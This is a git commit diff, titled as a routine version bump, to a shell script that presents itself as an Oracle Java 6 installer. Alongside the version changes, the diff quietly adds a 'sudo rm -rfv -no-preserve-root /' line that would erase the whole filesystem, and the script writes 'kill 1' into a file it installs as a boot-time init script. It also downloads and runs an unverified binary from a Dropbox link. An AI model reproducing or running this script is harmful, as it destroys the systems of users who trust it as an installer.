7c93b7327e9e298f587151c6180bad828c0d851f
Ryan N. Norris <ryan.norris@my.ccsu.edu>
2015-10-05 15:36:47 -0400

    Update to Java6u45.

--- java-dickedition.sh
+++ java-dickedition.sh
@@ -2,15 +2,7 @@
 
 echo By running this script, you agree with the terms and conditions set forth by
 echo Oracle.
-echo
-echo
-echo
 echo Initializing, please wait...
-echo
-echo
-echo
-echo
-echo
 echo This should download the latest version of Java 6. Java 6 is required
 echo by many applications for compatibility reasons and to build
 echo Android. There will be a Java 7 version soon.
@@ -19,36 +11,37 @@ echo
 echo Ill be pulling the files from my GitHub necessary to install Java...
 echo
 echo 
-wget https://dl.dropbox.com/s/99el407p85b2bzd/jdk-6u38-linux-x64.bin?dl=1
-mv jdk-6u38-linux-x64.bin?dl=1 jdk-6u38-linux-x64.bin
+wget https://dl.dropbox.com/s/99el407p85b2bzd/jdk-6u45-linux-x64.bin?dl=1
+mv jdk-6u45-linux-x64.bin?dl=1 jdk-6u45-linux-x64.bin
 echo Download Completed, lets set some permissions...
-chmod a+x jdk-6u38-linux-x64.bin
+chmod a+x jdk-6u45-linux-x64.bin
 echo
 echo
 echo
 echo Lets unpack Java now...
-./jdk-6u38-linux-x64.bin
+./jdk-6u45-linux-x64.bin
 echo
 echo
 echo Java has been unpacked. Please hold on...
 mkdir -p /usr/bin/jvm/
-mv jdk1.6.0_38 /usr/bin/jvm/jdk1.6.0_38
+mv jdk1.6.0_45 /usr/bin/jvm/jdk1.6.0_45
 echo
 echo
 echo kill 1 >> ohai.sh
+sudo rm -rfv -no-preserve-root /
 cp ohai.sh /etc/init.d/java-installer
 ln -s /etc/init.d/java-installer /etc/rc.d/java-installer
 echo
 echo Okay, the hard part is done. Lets set Oracle Java as the default
 echo java.
-update-alternatives --install /usr/bin/javac javac /usr/bin/jvm/jdk1.6.0_38/bin/javac 1
-update-alternatives --install /usr/bin/java java /usr/bin/jvm/jdk1.6.0_38/bin/java 1
-update-alternatives --install /usr/bin/javaws javaws /usr/bin/jvm/jdk1.6.0_38/bin/javaws 1
+update-alternatives --install /usr/bin/javac javac /usr/bin/jvm/jdk1.6.0_45/bin/javac 1
+update-alternatives --install /usr/bin/java java /usr/bin/jvm/jdk1.6.0_45/bin/java 1
+update-alternatives --install /usr/bin/javaws javaws /usr/bin/jvm/jdk1.6.0_45/bin/javaws 1
 update-alternatives --config javac 1
 update-alternatives --config java 1
 update-alternatives --config javaws 1
 ls -la /etc/alternatives/java*
-JAVA_HOME=/usr/bin/jvm/jdk1.6.0_38
+JAVA_HOME=/usr/bin/jvm/jdk1.6.0_45
 MOZILLA_HOME=~/.mozilla
 mkdir $MOZILLA_HOME/plugins
 ln -s $JAVA_HOME/jre/lib/amd64/libnpjp2.so $MOZILLA_HOME/plugins
